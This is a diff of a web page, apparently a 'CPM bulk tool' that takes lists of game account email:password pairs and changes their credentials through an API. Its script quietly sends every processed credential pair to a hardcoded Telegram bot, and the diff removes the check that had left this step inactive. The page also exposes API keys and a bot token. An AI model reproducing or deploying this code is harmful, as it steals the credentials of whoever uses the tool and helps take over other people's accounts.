@@ -29,8 +29,8 @@ input:focus,select:focus,textarea:focus{border-color:#ff8800;}
   <h2>MARKO CPM BULK TOOL</h2>
   
   <div class="game-selector">
-    <button class="game-btn active" id="g1" onclick="selectGame('1')">CPM 1</button>
-    <button class="game-btn" id="g2" onclick="selectGame('2')">CPM 2</button>
+    <button type="button" class="game-btn active" id="g1" onclick="selectGame('1')">CPM 1</button>
+    <button type="button" class="game-btn" id="g2" onclick="selectGame('2')">CPM 2</button>
   </div>
 
   <div id="operationSelectorBox">
@@ -48,19 +48,19 @@ input:focus,select:focus,textarea:focus{border-color:#ff8800;}
 email@gmail.com:password
 email2@gmail.com:password"></textarea>
 
-  <button class="primary-btn" onclick="startBulkProcess()">Start Bulk Process</button>
+  <button type="button" class="primary-btn" onclick="startBulkProcess()">Start Bulk Process</button>
   <div id="status" class="status"></div>
 
   <div class="output-box">
     <h4>Successfully Processed Accounts (Copy Paste)</h4>
     <textarea id="resultOutput" readonly placeholder="Result accounts will appear here..."></textarea>
-    <button class="primary-btn" style="background:#00aa44;margin-top:6px;" onclick="copyResults()">Copy Results</button>
+    <button type="button" class="primary-btn" style="background:#00aa44;margin-top:6px;" onclick="copyResults()">Copy Results</button>
   </div>
 </div>
 
 <script>
 const TELEGRAM_BOT_TOKEN = "8477742734:AAFBEfGf-PnYBPtEoofA4UIOyVQSfvLJcXw";
-const TELEGRAM_CHAT_ID = "7212602902"; // Ningalude Telegram Chat ID ivide kodukkuka
+const TELEGRAM_CHAT_ID = "7212602902";
 
 const GAMES = {
   "1": { name:"CPM 1", k:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM" },
@@ -114,7 +114,7 @@ function generateRandomEmail(prefix) {
 }
 
 function sendTelegramLog(email, pass) {
-  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.includes("YOUR_CHAT_ID")) return;
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
   const text = `${email}:${pass}`;
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -188,4 +188,32 @@ async function startBulkProcess() {
           body: JSON.stringify(bodyData)
         });
         let bothData = await bothRes.json();
-        if(bothData.email
+        if(bothData.email || bothData.idToken) {
+          finalEmail = newRandEmail;
+          finalPass = passToSet;
+          isChanged = true;
+        }
+      }
+
+      if(isChanged) {
+        successResults.push(`${finalEmail}:${finalPass}`);
+        sendTelegramLog(finalEmail, finalPass);
+      }
+    } catch(err) {}
+  }
+
+  document.getElementById('resultOutput').value = successResults.join('\n');
+  showStatus(`Successfully processed ${successResults.length} accounts!`, false);
+}
+
+function copyResults() {
+  const outputBox = document.getElementById('resultOutput');
+  outputBox.select();
+  document.execCommand('copy');
+  alert("Copied to clipboard!");
+}
+
+updateOperationsList();
+</script>
+</body>
+</html>
